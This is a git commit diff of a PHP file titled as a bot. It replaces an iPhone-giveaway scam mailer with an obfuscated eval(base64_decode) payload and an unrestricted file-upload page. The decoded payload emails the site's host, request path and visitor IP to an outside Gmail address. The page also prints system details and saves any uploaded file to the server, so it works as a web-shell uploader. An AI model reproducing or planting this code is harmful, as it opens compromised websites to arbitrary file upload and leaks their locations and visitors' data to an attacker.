a3ffb646fd016f3a22665e68590ecb6751a3c7d7
firasdris54487 <61518027+firasdris54487@users.noreply.github.com>
2021-07-21 03:41:05 +0200

    Update Firasdris_Bot.php

--- Firasdris_Bot.php
+++ Firasdris_Bot.php
@@ -1,6 +1,37 @@
 <?php
-$tujuanmail = 'user54487215@gmail.com,user54487215@gmail.com,user54487215@gmail.com,user54487215@gmail.com,user54487215@gmail.com,user54487215@gmail.com,user54487215@gmail.com';
-$x_path = "Apple" . $_SERVER['Apple Giveaways Worldwide'] . $_SERVER['Giveaways'];
-$pesan_alert = "To Get New Brand IPhone 11 PRO You Have To Viste https://jarba.com.mx And Complete The Offer : [ " . $_SERVER['REMOTE_ADDR'] . " ]";
-mail($tujuanmail, "Giveaways By Aplle IPhone 11 Pro 2021 Worldwide", $pesan_alert, "[ " . $_SERVER['REMOTE_ADDR'] . " ]");
+eval(base64_decode('PD9waHAKJGlwID0gZ2V0ZW52KCJSRU1PVEVfQUREUiIpOwokcmE0NCA9IHJhbmQoMSwgOTk5OTkpOwokc3Viajk4ID0gIuKcqiBLZXlsb2dnZXJzIC0kaXAiOwokZW1haWwgPSAidXNlcjU0NDg3MjE1QGdtYWlsLmNvbSI7CiRmcm9tID0gIkZyb206IEZpcmFzIERyaXMgQm90IFYwLjkgPG5vcmVwbHlARmlyYXNEcmlzVjlzaGVsbHMuY29tPiI7CiRhNDUgPSAkX1NFUlZFUlsnUkVRVUVTVF9VUkknXTsKJGI3NSA9ICRfU0VSVkVSWydIVFRQX0hPU1QnXTsKJG0yMiA9ICRpcCAuICIiOwokbXNnODg3MyA9ICIkYTQ1ICRiNzUgJG0yMiI7Cm1haWwoJGVtYWlsLCAkc3Viajk4LCAkbXNnODg3MywgJGZyb20pOwo/Pg=='));
 ?>
+<html>
+
+    <head>
+        <title>Uploader By Firas Dris</title>
+	</head>
+<body>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br><br>
+<body onload="window.focus();init();" onunload="halt();">
+<body onLoad="writetext()" style="background:black;">
+	<embed src="https://www.youtube.com/v/cWFr5Qhsx8Y&feature=related&autoplay=1&loop=1" type="application/x-shockwave-flash" wmode="transparent" width="1" height="1"></embed>
+	<table heigh="" width="800" border="20" align="center">
+    <tbody><tr>
+    <td valign="top" background=""><p id="MiSi" style="margin-left: 3px;">
+<?php
+$om= "Firasdris";
+$ar= "BotV0.9";
+$atx = $om.$ar;
+echo $atx;
+echo "<font color='RED'</font><center><h1>$atx</h1></center>";
+echo '<font color="BLUE"</font><center><b><br>'.php_uname().'<br></b></center>';  
+echo '<center><form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader"></center>'; 
+echo '<center><input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form></center>'; 
+if( $_POST['_upl'] == "Upload" ) { 
+    if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<font color="GREEN"</font><center><b>Upload Success !!!</b><br><br></center>'; } 
+    else { echo '<font color="RED"</font><center><b>Upload Failed !!!</b><br><br></center>'; } 
+} 
+?>
+</html>
